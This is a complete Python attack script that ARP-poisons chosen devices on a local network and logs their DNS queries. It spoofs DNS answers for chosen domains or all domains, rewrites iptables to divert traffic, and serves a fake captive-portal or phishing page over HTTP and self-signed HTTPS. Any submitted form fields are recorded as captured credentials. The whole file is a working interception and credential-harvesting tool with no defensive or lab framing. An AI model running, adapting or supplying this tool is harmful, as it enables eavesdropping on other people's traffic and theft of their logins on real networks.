#!/usr/bin/env python3

import argparse
import fcntl
import http.server
import ipaddress
import json
import signal
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
from urllib.parse import parse_qs, unquote_plus
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, DNSQR, DNSRR, srp, send, Ether, ARP, IP, UDP
from mac_vendor_lookup import MacLookup, VendorNotFoundError

DNS_QTYPES = {
    1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA', 12: 'PTR',
    15: 'MX', 16: 'TXT', 28: 'AAAA', 33: 'SRV', 255: 'ANY',
}

CAPTIVE_CHECK_DOMAINS = [
    'connectivitycheck.gstatic.com',
    'connectivitycheck.android.com',
    'clients3.google.com',
    'clients1.google.com',
]

DNS_PROXY_PORT = 5353

_mac_lookup = MacLookup()


def get_iface_ip(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(), 0x8915,
            struct.pack('256s', iface[:15].encode())
        )[20:24])
    finally:
        s.close()


# ---------------------------------------------------------------------------
# Spoof web server — HTTP :80 + HTTPS :443
# ---------------------------------------------------------------------------

DEFAULT_PAGE = """\
<!DOCTYPE html>
<html>
<head><title>Intercepted</title>
<style>body{font-family:sans-serif;max-width:600px;margin:80px auto;text-align:center}
h1{color:#c00}</style></head>
<body>
<h1>Connection Intercepted</h1>
<p>This request was intercepted via ARP MITM.</p>
</body>
</html>"""


def _generate_self_signed_cert():
    cert = tempfile.mktemp(suffix='.pem')
    key  = tempfile.mktemp(suffix='.key')
    subprocess.run([
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
        '-keyout', key, '-out', cert,
        '-days', '1', '-nodes',
        '-subj', '/CN=intercepted',
    ], check=True, capture_output=True)
    return cert, key


class SpoofWebServer:
    """HTTP + HTTPS server for spoofed domains.

    wildcard_mode=False  →  captive-check paths return 204 (Android stays quiet)
    wildcard_mode=True   →  captive-check paths return 200 + HTML, which triggers
                            Android's "Sign in to network" notification.
    """

    def __init__(self, page_html=DEFAULT_PAGE, wildcard_mode=False,
                 creds_file=None, redirect_url=None):
        self.page_bytes    = page_html.encode()
        self.wildcard_mode = wildcard_mode
        self.creds_file    = creds_file
        self.redirect_url  = redirect_url
        self._lock         = threading.Lock()
        self._servers      = []

    def _log_creds(self, client_ip, fields):
        ts   = strftime("%m/%d/%Y %H:%M:%S", localtime())
        line = (f'\n{"="*55}\n'
                f'{Fore.RED}[CREDS CAPTURED]{Style.RESET_ALL} '
                f'{Fore.GREEN}{ts}{Style.RESET_ALL} | '
                f'{Fore.BLUE}{client_ip}{Style.RESET_ALL}\n')
        for k, vals in fields.items():
            for v in vals:
                line += f'  {Fore.YELLOW}{k}{Style.RESET_ALL} = {Fore.RED}{v}{Style.RESET_ALL}\n'
        line += '='*55
        print(line)

        if self.creds_file:
            plain = f'[{ts}] {client_ip}\n'
            for k, vals in fields.items():
                for v in vals:
                    plain += f'  {k} = {v}\n'
            plain += '\n'
            with self._lock:
                self.creds_file.write(plain)
                self.creds_file.flush()

    def _make_handler(self):
        page         = self.page_bytes
        wildcard     = self.wildcard_mode
        redirect_url = self.redirect_url
        log_creds    = self._log_creds

        class Handler(http.server.BaseHTTPRequestHandler):
            timeout = 5

            def do_GET(self):
                if not wildcard and (
                    'generate_204' in self.path or 'generate204' in self.path
                ):
                    self.send_response(204)
                    self.end_headers()
                    return
                self._serve_page()

            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body   = self.rfile.read(length).decode('utf-8', errors='replace')
                ct     = self.headers.get('Content-Type', '')

                if 'application/json' in ct:
                    try:
                        obj    = json.loads(body)
                        fields = {k: [str(v)] for k, v in obj.items()}
                    except Exception:
                        fields = {'raw': [body]}
                else:
                    fields = parse_qs(body, keep_blank_values=True)

                if fields:
                    log_creds(self.client_address[0], fields)

                if redirect_url:
                    self.send_response(302)
                    self.send_header('Location', redirect_url)
                    self.send_header('Connection', 'close')
                    self.end_headers()
                else:
                    self._serve_page()

            def _serve_page(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(page)))
                self.send_header('Connection', 'close')
                self.end_headers()
                self.wfile.write(page)

            def log_message(self, *_):
                pass

        return Handler

    def start(self):
        handler  = self._make_handler()
        mode_tag = 'phishing/wildcard' if self.wildcard_mode else 'normal'

        http_srv = http.server.ThreadingHTTPServer(('0.0.0.0', 80), handler)
        threading.Thread(target=http_srv.serve_forever, daemon=True).start()
        self._servers.append(http_srv)

        try:
            cert, key = _generate_self_signed_cert()
            https_srv = http.server.ThreadingHTTPServer(('0.0.0.0', 443), handler)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert, key)
            https_srv.socket = ctx.wrap_socket(https_srv.socket, server_side=True)
            threading.Thread(target=https_srv.serve_forever, daemon=True).start()
            self._servers.append(https_srv)
            print(f'{Fore.YELLOW}[*] Spoof web server [{mode_tag}] '
                  f'on :80 (HTTP) and :443 (HTTPS, self-signed){Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.YELLOW}[*] Spoof web server [{mode_tag}] '
                  f'on :80 only (HTTPS failed: {e}){Style.RESET_ALL}')

    def stop(self):
        for srv in self._servers:
            try:
                srv.shutdown()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# DNS proxy — intercepts redirected queries, spoofs or forwards them
# ---------------------------------------------------------------------------

class DNSProxy:
    def __init__(self, spoof_map, upstream='8.8.8.8', port=DNS_PROXY_PORT):
        self.spoof_map = spoof_map
        self.upstream  = upstream
        self.port      = port
        self._sock     = None
        self._stop     = threading.Event()

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(('0.0.0.0', self.port))
        self._sock.settimeout(1.0)
        threading.Thread(target=self._run, daemon=True).start()
        print(f'{Fore.YELLOW}[*] DNS proxy on 0.0.0.0:{self.port} '
              f'(upstream: {self.upstream}){Style.RESET_ALL}')

    def _run(self):
        while not self._stop.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(data, addr), daemon=True).start()

    def _handle(self, data, addr):
        try:
            pkt    = DNS(data)
            if pkt.qd is None:
                return
            domain = pkt.qd.qname.decode('utf-8').rstrip('.')
            fake_ip = self._match_spoof(domain)
            if fake_ip:
                resp = DNS(
                    id=pkt.id, qr=1, aa=1, rd=pkt.rd,
                    qdcount=1, ancount=1,
                    qd=pkt.qd,
                    an=DNSRR(rrname=pkt.qd.qname, type='A', ttl=300, rdata=fake_ip),
                )
                self._sock.sendto(bytes(resp), addr)
            else:
                fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                fwd.settimeout(3.0)
                try:
                    fwd.sendto(data, (self.upstream, 53))
                    resp_data, _ = fwd.recvfrom(4096)
                    self._sock.sendto(resp_data, addr)
                except socket.timeout:
                    pass
                finally:
                    fwd.close()
        except Exception:
            pass

    def _match_spoof(self, domain):
        d = domain.lower()
        if d in self.spoof_map:
            return self.spoof_map[d]
        for rule, ip in self.spoof_map.items():
            if rule != '*' and d.endswith('.' + rule):
                return ip
        return self.spoof_map.get('*')

    def stop(self):
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass


def add_dns_redirect(target_ips, proxy_port):
    for ip in target_ips:
        _run(['iptables', '-t', 'nat', '-I', 'PREROUTING', '1',
              '-s', ip, '-p', 'udp', '--dport', '53',
              '-j', 'REDIRECT', '--to-port', str(proxy_port)])
    print(f'{Fore.YELLOW}[*] DNS traffic from targets redirected to proxy '
          f'port {proxy_port}{Style.RESET_ALL}')


def remove_dns_redirect(target_ips, proxy_port):
    for ip in target_ips:
        _run(['iptables', '-t', 'nat', '-D', 'PREROUTING',
              '-s', ip, '-p', 'udp', '--dport', '53',
              '-j', 'REDIRECT', '--to-port', str(proxy_port)],
             ignore_error=True)


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run(cmd, ignore_error=False):
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0 and not ignore_error:
        raise subprocess.CalledProcessError(result.returncode, cmd)


def _sysctl_read(key):
    path = f'/proc/sys/{key.replace(".", "/")}'
    with open(path) as f:
        return f.read().strip()


def _sysctl_write(key, value):
    path = f'/proc/sys/{key.replace(".", "/")}'
    with open(path, 'w') as f:
        f.write(str(value))


def _docker_user_exists():
    return subprocess.run(['iptables', '-L', 'DOCKER-USER', '-n'],
                          capture_output=True).returncode == 0


def setup_routing(iface):
    saved = {}

    saved['net.ipv4.ip_forward'] = _sysctl_read('net.ipv4.ip_forward')
    _sysctl_write('net.ipv4.ip_forward', '1')

    for key in ('net.ipv4.conf.all.rp_filter', f'net.ipv4.conf.{iface}.rp_filter'):
        saved[key] = _sysctl_read(key)
        _sysctl_write(key, '0')

    for key in ('net.ipv6.conf.all.disable_ipv6', 'net.ipv6.conf.default.disable_ipv6'):
        saved[key] = _sysctl_read(key)
        _sysctl_write(key, '1')

    _run(['iptables', '-I', 'FORWARD', '1',
          '-m', 'conntrack', '--ctstate', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'])
    _run(['iptables', '-I', 'FORWARD', '1', '-o', iface, '-j', 'ACCEPT'])
    _run(['iptables', '-I', 'FORWARD', '1', '-i', iface, '-j', 'ACCEPT'])

    if _docker_user_exists():
        _run(['iptables', '-I', 'DOCKER-USER', '1',
              '-m', 'conntrack', '--ctstate', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'])
        _run(['iptables', '-I', 'DOCKER-USER', '1', '-o', iface, '-j', 'ACCEPT'])
        _run(['iptables', '-I', 'DOCKER-USER', '1', '-i', iface, '-j', 'ACCEPT'])
        saved['docker_user'] = True

    print(f'{Fore.YELLOW}[*] Routing configured on {iface} '
          f'(fwd=1, rp_filter=0, ipv6 disabled){Style.RESET_ALL}')
    return saved


def teardown_routing(iface, saved):
    for cmd in [
        ['iptables', '-D', 'FORWARD', '-i', iface, '-j', 'ACCEPT'],
        ['iptables', '-D', 'FORWARD', '-o', iface, '-j', 'ACCEPT'],
        ['iptables', '-D', 'FORWARD',
         '-m', 'conntrack', '--ctstate', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
    ]:
        _run(cmd, ignore_error=True)

    if saved.get('docker_user'):
        for cmd in [
            ['iptables', '-D', 'DOCKER-USER', '-i', iface, '-j', 'ACCEPT'],
            ['iptables', '-D', 'DOCKER-USER', '-o', iface, '-j', 'ACCEPT'],
            ['iptables', '-D', 'DOCKER-USER',
             '-m', 'conntrack', '--ctstate', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
        ]:
            _run(cmd, ignore_error=True)

    for key, value in saved.items():
        if key.startswith('net.'):
            _sysctl_write(key, value)

    print(f'{Fore.YELLOW}[*] Routing teardown complete{Style.RESET_ALL}')


def restore_arp(routerip, targetip, iface):
    try:
        router_mac = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=routerip),
                         timeout=2, iface=iface, verbose=False)[0][0].answer[ARP].hwsrc
        target_mac = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=targetip),
                         timeout=2, iface=iface, verbose=False)[0][0].answer[ARP].hwsrc
        send(ARP(op=2, pdst=routerip, hwdst=router_mac, psrc=targetip, hwsrc=target_mac),
             count=5, verbose=False, iface=iface)
        send(ARP(op=2, pdst=targetip, hwdst=target_mac, psrc=routerip, hwsrc=router_mac),
             count=5, verbose=False, iface=iface)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# ARP scan
# ---------------------------------------------------------------------------

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                 timeout=5, iface=iface, verbose=False)

    devices = []
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i, pkt in enumerate(ans, 1):
        mac = pkt.answer[ARP].hwsrc
        ip  = pkt.answer[ARP].psrc
        try:
            vendor = _mac_lookup.lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'  [{i}] {Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
        devices.append(ip)

    print(f'\n  [a] All devices')
    raw = input('\nPick device number(s), comma-separated, or "a" for all: ').strip()

    if raw.lower() == 'a':
        return devices

    targets = []
    for token in raw.split(','):
        token = token.strip()
        if token.isdigit():
            idx = int(token) - 1
            if 0 <= idx < len(devices):
                targets.append(devices[idx])
            else:
                print(f'  {Fore.RED}Invalid index {token}, skipping{Style.RESET_ALL}')
        else:
            targets.append(token)
    return targets


def parse_spoof_rules(raw_rules):
    rules = {}
    for entry in raw_rules or []:
        if ':' not in entry:
            raise argparse.ArgumentTypeError(
                f'--spoof "{entry}" must be in domain:ip or *:ip format')
        domain, _, ip = entry.partition(':')
        domain = domain.lower().strip()
        try:
            ipaddress.IPv4Address(ip)
        except ValueError:
            raise argparse.ArgumentTypeError(
                f'--spoof "{entry}": "{ip}" is not a valid IPv4 address')
        rules[domain] = ip
    return rules


# ---------------------------------------------------------------------------
# Per-target device: ARP poisoning + DNS logging
# ---------------------------------------------------------------------------

class Device:
    def __init__(self, routerip, targetip, iface, output_file=None,
                 dedup_window=0, spoof_map=None):
        self.routerip     = routerip
        self.targetip     = targetip
        self.iface        = iface
        self.output_file  = output_file
        self.dedup_window = dedup_window
        self.spoof_map    = spoof_map or {}
        self._stop        = threading.Event()
        self._seen        = {}
        self._lock        = threading.Lock()

    def _mitm_loop(self):
        while not self._stop.is_set():
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface, inter=1)
            except OSError:
                if not self._stop.is_set():
                    print(f'  {Fore.YELLOW}[{self.targetip}] IP down, retrying…{Style.RESET_ALL}')
                    time.sleep(2)

    def _capture_loop(self):
        sniff(
            iface=self.iface,
            prn=self._handle_dns,
            filter=f'src host {self.targetip} and udp port 53',
            stop_filter=lambda _: self._stop.is_set(),
        )

    def _handle_dns(self, pkt):
        if not pkt.haslayer(DNS):
            return
        dns = pkt[DNS]
        if dns.qr != 0 or dns.qd is None:
            return

        try:
            domain = dns.qd.qname.decode('utf-8').rstrip('.')
        except Exception:
            return

        qtype   = DNS_QTYPES.get(dns.qd.qtype, str(dns.qd.qtype))
        fake_ip = self._match_spoof(domain)

        if self.dedup_window > 0:
            now = time.monotonic()
            key = (self.targetip, domain, qtype)
            with self._lock:
                if now - self._seen.get(key, 0) < self.dedup_window:
                    return
                self._seen[key] = now

        ts = strftime("%m/%d/%Y %H:%M:%S", localtime())
        if fake_ip:
            line = (f'[{Fore.GREEN}{ts}{Style.RESET_ALL} | '
                    f'{Fore.BLUE}{self.targetip}{Style.RESET_ALL} -> '
                    f'{Fore.RED}{domain}{Style.RESET_ALL} '
                    f'({Fore.YELLOW}{qtype}{Style.RESET_ALL}) '
                    f'{Fore.RED}[SPOOFED -> {fake_ip}]{Style.RESET_ALL}]')
        else:
            line = (f'[{Fore.GREEN}{ts}{Style.RESET_ALL} | '
                    f'{Fore.BLUE}{self.targetip}{Style.RESET_ALL} -> '
                    f'{Fore.RED}{domain}{Style.RESET_ALL} '
                    f'({Fore.YELLOW}{qtype}{Style.RESET_ALL})]')
        print(line)

        if self.output_file:
            note = f' [SPOOFED -> {fake_ip}]' if fake_ip else ''
            plain = f'[{ts} | {self.targetip} -> {domain} ({qtype}){note}]\n'
            with self._lock:
                self.output_file.write(plain)
                self.output_file.flush()

    def _match_spoof(self, domain):
        d = domain.lower()
        if d in self.spoof_map:
            return self.spoof_map[d]
        for rule, ip in self.spoof_map.items():
            if rule != '*' and d.endswith('.' + rule):
                return ip
        return self.spoof_map.get('*')

    def start(self):
        threading.Thread(target=self._mitm_loop, daemon=True).start()
        threading.Thread(target=self._capture_loop, daemon=True).start()
        print(f'  {Fore.GREEN}[+] Sniffing {self.targetip}{Style.RESET_ALL}')

    def stop(self):
        self._stop.set()
        print(f'  {Fore.YELLOW}[-] Restoring ARP for {self.targetip}…{Style.RESET_ALL}')
        restore_arp(self.routerip, self.targetip, self.iface)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description='DNS sniffer via ARP MITM')
    parser.add_argument('--network',    required=True,
                        help='Network to scan (e.g. "192.168.0.0/24")')
    parser.add_argument('--iface',      required=True,
                        help='Network interface to use')
    parser.add_argument('--routerip',   required=True,
                        help='IP of your router/gateway')
    parser.add_argument('--dns',        default='8.8.8.8',
                        help='Upstream DNS for non-spoofed queries (default: 8.8.8.8)')
    parser.add_argument('--output',     default=None,
                        help='File to append DNS log to (plain text)')
    parser.add_argument('--dedup',      type=int, default=0, metavar='SECONDS',
                        help='Suppress duplicate queries within N seconds (0=off)')
    parser.add_argument('--spoof',      action='append', default=[], metavar='DOMAIN:IP',
                        help='Spoof DNS for DOMAIN with fake IP; use *:IP to spoof everything (repeatable)')
    parser.add_argument('--no-captive', action='store_true',
                        help='Disable automatic captive-portal / spoof web server')
    parser.add_argument('--page',       default=None, metavar='FILE',
                        help='HTML file to serve on spoofed domains (default: built-in page)')
    parser.add_argument('--creds',      default=None, metavar='FILE',
                        help='File to append captured credentials to')
    parser.add_argument('--redirect',   default=None, metavar='URL',
                        help='Redirect target after credentials are submitted (e.g. https://example.com)')
    opts = parser.parse_args()

    try:
        spoof_map = parse_spoof_rules(opts.spoof)
    except argparse.ArgumentTypeError as e:
        parser.error(str(e))

    wildcard_mode = '*' in spoof_map

    portal = None
    if not opts.no_captive:
        try:
            attacker_ip = get_iface_ip(opts.iface)
            if not wildcard_mode:
                for domain in CAPTIVE_CHECK_DOMAINS:
                    spoof_map.setdefault(domain, attacker_ip)
            page_html = DEFAULT_PAGE
            if opts.page:
                with open(opts.page) as f:
                    page_html = f.read()
            creds_file = open(opts.creds, 'a') if opts.creds else None
            portal = SpoofWebServer(
                page_html=page_html,
                wildcard_mode=wildcard_mode,
                creds_file=creds_file,
                redirect_url=opts.redirect,
            )
            portal.start()
        except Exception as e:
            print(f'{Fore.YELLOW}[!] Web server failed ({e}){Style.RESET_ALL}')

    dns_proxy = DNSProxy(spoof_map, upstream=opts.dns, port=DNS_PROXY_PORT)
    dns_proxy.start()

    if spoof_map:
        print(f'\n{Fore.RED}[!] Spoof rules:{Style.RESET_ALL}')
        for domain, ip in spoof_map.items():
            tag = '(all domains)' if domain == '*' else (
                  '(captive)' if domain in CAPTIVE_CHECK_DOMAINS else '')
            print(f'    {domain}  ->  {ip}  {tag}')
        print()

    routing_saved = setup_routing(opts.iface)
    targets = arp_scan(opts.network, opts.iface)
    if not targets:
        print(f'{Fore.RED}No targets selected. Exiting.{Style.RESET_ALL}')
        sys.exit(1)

    add_dns_redirect(targets, DNS_PROXY_PORT)

    outfile = open(opts.output, 'a') if opts.output else None
    devices = [
        Device(opts.routerip, ip, opts.iface, outfile, opts.dedup, spoof_map)
        for ip in targets
    ]

    def shutdown(sig, frame):
        print(f'\n{Fore.YELLOW}Shutting down…{Style.RESET_ALL}')
        for d in devices:
            d.stop()
        remove_dns_redirect(targets, DNS_PROXY_PORT)
        dns_proxy.stop()
        if portal:
            portal.stop()
        teardown_routing(opts.iface, routing_saved)
        if outfile:
            outfile.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    for d in devices:
        d.start()

    print(f'\n{Fore.GREEN}Listening. Press Ctrl+C to stop.{Style.RESET_ALL}\n')
    signal.pause()


if __name__ == '__main__':
    main()
